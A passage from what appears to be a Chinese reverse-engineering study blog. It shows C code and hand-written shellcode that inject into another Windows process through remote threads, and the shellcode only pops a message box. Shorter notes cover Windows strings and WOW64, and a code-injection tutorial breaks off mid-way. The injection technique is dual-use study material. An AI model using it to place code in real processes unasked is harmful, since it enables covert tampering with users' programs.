class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BYTE shellcode[] = {</span><br><span class="line"> <span class="number">0x55</span>,<span class="number">0x8B</span>,<span class="number">0xEC</span>,<span class="number">0x8B</span>,<span class="number">0x75</span>,<span class="number">0x08</span>,<span class="number">0x68</span>,<span class="number">0x6C</span>,<span class="number">0x6C</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x68</span>,<span class="number">0x33</span>,<span class="number">0x32</span>,<span class="number">0x2E</span>,<span class="number">0x64</span></span><br><span class="line">,<span class="number">0x68</span>,<span class="number">0x75</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x54</span>,<span class="number">0xFF</span>,<span class="number">0x16</span>,<span class="number">0x68</span>,<span class="number">0x6F</span>,<span class="number">0x78</span>,<span class="number">0x41</span>,<span class="number">0x00</span>,<span class="number">0x68</span>,<span class="number">0x61</span>,<span class="number">0x67</span></span><br><span class="line">,<span class="number">0x65</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x4D</span>,<span class="number">0x65</span>,<span class="number">0x73</span>,<span class="number">0x73</span>,<span class="number">0x54</span>,<span class="number">0x50</span>,<span class="number">0xFF</span>,<span class="number">0x56</span>,<span class="number">0x04</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0xE8</span>,<span class="number">0x0C</span></span><br><span class="line">,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x52</span>,<span class="number">0x65</span>,<span class="number">0x76</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x43</span>,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x00</span>,<span class="number">0xE8</span></span><br><span class="line">,<span class="number">0x14</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x2E</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x76</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x63</span></span><br><span class="line">,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x2E</span>,<span class="number">0x63</span>,<span class="number">0x6F</span>,<span class="number">0x6D</span>,<span class="number">0x00</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0xFF</span>,<span class="number">0xD0</span>,<span class="number">0x33</span>,<span class="number">0xC0</span>,<span class="number">0x8B</span>,<span class="number">0xE5</span></span><br><span class="line">,<span class="number">0x5D</span>,<span class="number">0xC3</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Thread_Param</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">FARPROC pFunc[<span class="number">2</span>];<span class="comment">//Loadlibrary,GetProcAddress</span></span><br><span class="line">}Thread_Param, * pThread_Param;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Asm_Inject</span><span class="params">(DWORD PID)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">Thread_Param param[<span class="number">2</span>] = { <span class="number">0</span>, };</span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">LPVOID pRemoteBuf[<span class="number">2</span>] = { <span class="number">0</span>, };</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取kernel32.dll的句柄</span></span><br><span class="line">hMod = GetModuleHandleA(<span class="string">"kernel32.dll"</span>);</span><br><span class="line"><span class="comment">//将需要使用的函数存储</span></span><br><span class="line">param-&gt;pFunc[<span class="number">0</span>] = GetProcAddress(hMod, <span class="string">"LoadLibraryA"</span>);</span><br><span class="line">param-&gt;pFunc[<span class="number">1</span>] = GetProcAddress(hMod, <span class="string">"GetProcAddress"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//开启进程</span></span><br><span class="line"><span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID)))</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Open Failed!!Error Code:%d\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//开辟空间并写入</span></span><br><span class="line"><span class="keyword">if</span> (!(pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(Thread_Param), MEM_COMMIT, PAGE_READWRITE)))</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"VirtualAlloc Failed!!Error Code:%d\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!WriteProcessMemory(hProcess, pRemoteBuf[<span class="number">0</span>], (LPVOID)&amp;param, <span class="keyword">sizeof</span>(Thread_Param), <span class="literal">NULL</span>))</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"WriteProcess Failed!!Error Code:%d\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//将我们的shellcode写入</span></span><br><span class="line"><span class="keyword">if</span> (!(pRemoteBuf[<span class="number">1</span>] = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT, PAGE_READWRITE)))</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"VirtualAlloc Failed!!Error Code:%d\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!WriteProcessMemory(hProcess, pRemoteBuf[<span class="number">1</span>], (LPVOID)&amp;shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="literal">NULL</span>))</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"WriteProcess Failed!!Error Code:%d\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="number">1</span>], pRemoteBuf[<span class="number">0</span>], <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>*argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">Asm_Inject((DWORD)atol(argv[<span class="number">1</span>]));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>本质上和代码注入没区别，主要是我们将字符串也包含在了注入的代码里面，所以在线程函数中不再需要使用字符数组存储</p><h1 id="0x03-分析"><a class="header-anchor" href="#0x03-分析">¶</a>0x03-分析</h1><p>在OD中打开并注入，让其停在新线程</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650001855752.png" alt></p><p>先提升堆栈，然后将函数的参数存入ESI中，也就是线程函数对应的THREAD_PARAM结构体，因为里面只有两个函数指针，所以大小为0x8</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002105819.png" alt="ESI的值"></p><p>我们执行完移动到esi这一步，去内存中查看ESI存储的值</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002164069.png" alt></p><p>将其转为地址，注释中会告知我们其对应的API函数</p><p>接下来的四个PUSH+call可以知道是调用函数，LoadLibraryA只需要一个参数</p><p>前面三个PUSH是将函数名称压入栈，而最后一个是将当前的ESP的值压入栈，而当前ESP的值正好是存储字符串的地址，这样就实现了给LoadLibraryA传参</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002382351.png" alt></p><p>需要注意这里是小端序</p><p>接下来的四个PUSH和前面是一样的，关键是最后一个PUSH</p><blockquote><p><strong>因为返回值一般存储在EAX，并且函数调用时入栈顺序是从右往左依次入栈</strong></p></blockquote><p>这里的EAX存储的值就是user32.dll的句柄，也就是地址，在eax寄存器中OD也自动标明了</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002603450.png" alt></p><p>最后获取到MessageBoxA的地址</p><p>MessageBoxA的传参</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002654110.png" alt></p><p>这一段本来是字符串，但是OD给我们识别成了代码</p><p>执行完之后</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002721021.png" alt></p><p>可以看到我们的MessageBoxA的参数都在栈中了</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002770898.png" alt="调用MessageBoxA"></p><p>最后就是清空eax和恢复堆栈了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;代码注入-汇编&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>加密与解密第四版</title>
    <link href="https://gift1a.github.io/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/"/>
    <id>https://gift1a.github.io/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/</id>
    <published>2022-04-13T01:18:40.000Z</published>
    <updated>2022-04-20T05:40:17.961Z</updated>
    
    <content type="html"><![CDATA[<p>《加密与解密》</p><span id="more"></span> <h1 id="0x00-基础知识"><a class="header-anchor" href="#0x00-基础知识">¶</a>0x00-基础知识</h1><h2 id="字符集"><a class="header-anchor" href="#字符集">¶</a>字符集</h2><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814834555.png" alt></p><h2 id="大小端序"><a class="header-anchor" href="#大小端序">¶</a>大小端序</h2><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814898304.png" alt></p><h2 id="Windows操作系统"><a class="header-anchor" href="#Windows操作系统">¶</a>Windows操作系统</h2><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814924513.png" alt="重要DLL"></p><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814970448.png" alt="Unicode与ANSI函数"></p><h2 id="WOW64-v2"><a class="header-anchor" href="#WOW64-v2">¶</a>WOW64</h2><p>WOW64是64位Windows操作系统的子系统，可以使大多数32位应用程序在不修改的情况下运行在64位操作系统上</p><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649815151630.png" alt="WOW64操作过程"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;《加密与解密》&lt;/p&gt;</summary>
    
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Windows核心编程</title>
    <link href="https://gift1a.github.io/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/"/>
    <id>https://gift1a.github.io/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/</id>
    <published>2022-04-13T01:06:43.000Z</published>
    <updated>2022-04-20T05:33:38.492Z</updated>
    
    <content type="html"><![CDATA[<p>Windows核心编程</p><span id="more"></span> <h1 id="0x00-错误处理"><a class="header-anchor" href="#0x00-错误处理">¶</a>0x00-错误处理</h1><p>在WinError.h头文件中包含了Microsoft定义的错误代码列表，每个错误都有三种表示：一个消息ID(一个可在源代码使用的宏，用于与GetLastError的返回值进行比较)、消息文本(描述错误的英文文本)和一个编号(应该避免使用此编号，尽量使用消息ID)</p><p>所以在Windows函数失败之后，应该立马调用GetLastError()</p><h1 id="0x01-字符和字符串处理"><a class="header-anchor" href="#0x01-字符和字符串处理">¶</a>0x01-字符和字符串处理</h1><h2 id="ANSI与UNCODE"><a class="header-anchor" href="#ANSI与UNCODE">¶</a>ANSI与UNCODE</h2><blockquote><p>在Windows Vista中，每个Unicode字符都使用UTF-16编码，UTF-16将每个字符编码为2个字节也就是16位</p></blockquote><p>我们知道在C语言中，char数据类型表示一个8位ANSI字符，也就是一个字节</p><p>当我们声明Unicode字符和字符串时，只需要在字符串前加上”L“，表示以UTF-16来编码每个字符</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1649813453705.png" alt></p><h2 id="Unicode函数与ANSI函数"><a class="header-anchor" href="#Unicode函数与ANSI函数">¶</a>Unicode函数与ANSI函数</h2><p>自Windows NT起，Windows所有的版本都完全用Unicode来构建。也就是说所有核心函数(创建窗口、显示文本、进行字符串处理)都需要Unicode字符串</p><p>在Windows中，Windows函数通常具有两个版本，用于接收不同的字符串</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1649813717040.png" alt></p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1649813766466.png" alt="默认版本"></p><h2 id="C运行库中的Unicode函数和ANSI函数"><a class="header-anchor" href="#C运行库中的Unicode函数和ANSI函数">¶</a>C运行库中的Unicode函数和ANSI函数</h2><p>和Windows函数一样，C运行库提供了一系列函数处理ANSI字符和字符串，并提供了一系列函数来处理Unicode字符与字符串</p><p>在C运行库中，strlen就是一个能返回ANSI字符串长度的函数。与之对应的是wcslen，这个C运行库函数能返回Unicode字符串的长度，这两个函数都在string.h中</p><h2 id="C运行库中的安全字符串函数"><a class="header-anchor" href="#C运行库中的安全字符串函数">¶</a>C运行库中的安全字符串函数</h2><blockquote><p><strong>任何修改字符串的函数都存在一个安全隐患：如果目标字符串缓冲区不够大，无法容纳所生成的字符串，就会导致内存中的数据被破坏</strong></p></blockquote><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650011578747.png" alt="例子"></p><p>为了防止被被恶意软件肆意滥用，微软提供了一系列新的函数来取代C运行库的不安全的字符串处理函数</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650011917625.png" alt></p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012022950.png" alt></p><p>书中没有详细介绍，可以自行查找</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012306710.png" alt="安全字符串函数"></p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012361902.png" alt="安全字符串函数执行"></p><h1 id="Windows字符串函数"><a class="header-anchor" href="#Windows字符串函数">¶</a>Windows字符串函数</h1><p>不知道讲了些啥</p><h2 id="为何要用Unicode"><a class="header-anchor" href="#为何要用Unicode">¶</a>为何要用Unicode</h2><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012784209.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Windows核心编程&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>代码注入</title>
    <link href="https://gift1a.github.io/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    <id>https://gift1a.github.io/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</id>
    <published>2022-04-12T03:41:45.000Z</published>
    <updated>2022-04-20T05:46:47.067Z</updated>
    
    <content type="html"><![CDATA[<p>代码注入</p><span id="more"></span> <h1 id="0x00-前言-v2"><a class="header-anchor" href="#0x00-前言-v2">¶</a>0x00-前言</h1><p>感觉《逆向工程核心原理》只是进行了一点介绍，但是我理解能力有限</p><p>于是翻阅到了这篇文章</p><p><a href="https://www.52pojie.cn/thread-1270499-1-1.html">https://www.52pojie.cn/thread-1270499-1-1.html</a></p><h1 id="0x01-原理"><a class="header-anchor" href="#0x01-原理">¶</a>0x01-原理</h1><p>在DLL注入中，我们通过远程线程在目标进程中调用LoadLibraryA()函数加载我们的DLL</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649738932188.png" alt></p><p>实际上只要我们定义的函数符合CreateRemoteThread参数中定义的函数模板，就可以通过远程线程的方式去执行它，而不限于LoadLibraryA</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_ LPVOID lpParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>所以我们只要定义一个只有一个参数的函数，把它转换成 LPTHREAD_START_ROUTINE（CreateRemoteThread的参数）即可。</p><p>但是这里产生了一个问题，如果我们的函数具有多个参数怎么办呢，要成功调用函数的话，我们的参数也需要在目标进程的虚拟内存中</p><blockquote><p>对于将我们的参数写入虚拟内存中，我们可以使用VirtualAllocEx函数向目标申请内存虚拟空间</p><p>对于多个参数，我们可以构建一个结构体存放所有的参数，然后在调用的时候通过内存偏移来访问参数</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">INJECT_DATA</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="keyword">char</span> lpText[<span class="number">8</span>];  <span class="comment">//参数1</span></span><br><span class="line">    <span class="keyword">char</span> lpCaption[<span class="number">8</span>];  <span class="comment">//参数2</span></span><br><span class="line">}INJECT_DATA;</span><br></pre></td></tr></tbody></table></figure><p>下面以MessageBoxA函数为例</p><h2 id="定义函数指针"><a class="header-anchor" href="#定义函数指针">¶</a>定义函数指针</h2><p>首先先进行定义我们要使用到的函数指针</p><p>因为我们要调用user32.dll中的MessageBoxA，所以要使用LoadLibraryA()加载user32.dll，并且使用GetProcAddress()获取MessageBoxA的函数地址</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义函数指针，方便调用HOMDULE是返回值，WINAPI也就是__stdcall，是调用约定，类型名为PFLOADLIBRARYA，lpLivFileName是参数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI *PFLOADLIBRARYA)</span><span class="params">(LPCSTR lpLibFileName)</span></span>;<span class="comment">//前面的是返回值，中间是类型</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI *PFGETPROCADDRESS)</span><span class="params">(HMODULE hModule,LPCSTR lpProcName)</span></span>;<span class="comment">//返回值是一个回调函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI *PFMESSAGEBOXA)</span><span class="params">(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)</span></span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="定义线程信息块"><a class="header-anchor" href="#定义线程信息块">¶</a>定义线程信息块</h2><p>使用结构体存储我们要调用的函数信息</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个存储线程信息的结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">THREAD_PARAM</span>//定义线程信息</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    FARPROC pFunc[<span class="number">2</span>];               <span class="comment">// LoadLibraryA(), GetProcAddress()  </span></span><br><span class="line">    <span class="keyword">char</span>    szBuf[<span class="number">4</span>][<span class="number">128</span>];          <span class="comment">// "user32.dll", "MessageBoxA", "Inject Success!!", "Hint"  </span></span><br><span class="line">} THREAD_PARAM, * PTHREAD_PARAM;<span class="comment">//分别是线程信息块和指向线程信息的指针</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="线程信息块赋值"><a class="header-anchor" href="#线程信息块赋值">¶</a>线程信息块赋值</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hMod = GetModuleHandleA(<span class="string">"kernel32.dll"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//先给线程信息块赋值 </span></span><br><span class="line">param.pFunc[<span class="number">0</span>] = GetProcAddress(hMod, <span class="string">"LoadLibraryA"</span>);</span><br><span class="line">param.pFunc[<span class="number">1</span>] = GetProcAddress(hMod, <span class="string">"GetProcAddress"</span>);<span class="comment">//因为kernel32在内存中优先被装载，所以在不同进程中都一样</span></span><br><span class="line">strcpy_s(param.szBuf[<span class="number">0</span>], <span class="string">"user32.dll"</span>);</span><br><span class="line">strcpy_s(param.szBuf[<span class="number">1</span>], <span class="string">"MessageBoxA"</span>);</span><br><span class="line">strcpy_s(param.szBuf[<span class="number">2</span>], <span class="string">"InjectCode Success!!"</span>);</span><br><span class="line">strcpy_s(param.szBuf[<span class="number">3</span>], <span class="string">"Hint"</span>);</span><br></pre></td></tr></tbody></table></figure><h2 id="打开目标进程"><a class="header-anchor" href="#打开目标进程">¶</a>打开目标进程</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开启进程  </span></span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPID)))              </span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenProcess() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h2 id="开辟内存并写入线程信息"><a class="header-anchor" href="#开辟内存并写入线程信息">¶</a>开辟内存并写入线程信息</h2><p>第一次写入的是线程函数要调用的函数信息</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为注入的线程信息块中的第一个函数开辟内存 </span></span><br><span class="line">    dwSize = <span class="keyword">sizeof</span>(THREAD_PARAM);</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx(hProcess,<span class="literal">NULL</span>,dwSize,MEM_COMMIT,PAGE_READWRITE)))    </span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//写入线程信息块中函数的值和参数到进程中</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,pRemoteBuf[<span class="number">0</span>],(LPVOID)&amp;param,dwSize,<span class="literal">NULL</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>第二次将线程函数写入内存</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//再次开辟  </span></span><br><span class="line">    dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">1</span>] = VirtualAllocEx(hProcess,<span class="literal">NULL</span>,dwSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE)))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//函数调用</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,pRemoteBuf[<span class="number">1</span>],(LPVOID)ThreadProc,dwSize,<span class="literal">NULL</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h2 id="开启远程线程"><a class="header-anchor" href="#开启远程线程">¶</a>开启远程线程</h2><p>在目标线程中开启远程线程</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(hThread = CreateRemoteThread(hProcess,<span class="literal">NULL</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="number">1</span>],pRemoteBuf[<span class="number">0</span>],<span class="number">0</span>,<span class="literal">NULL</span>)))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"CreateRemoteThread() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h2 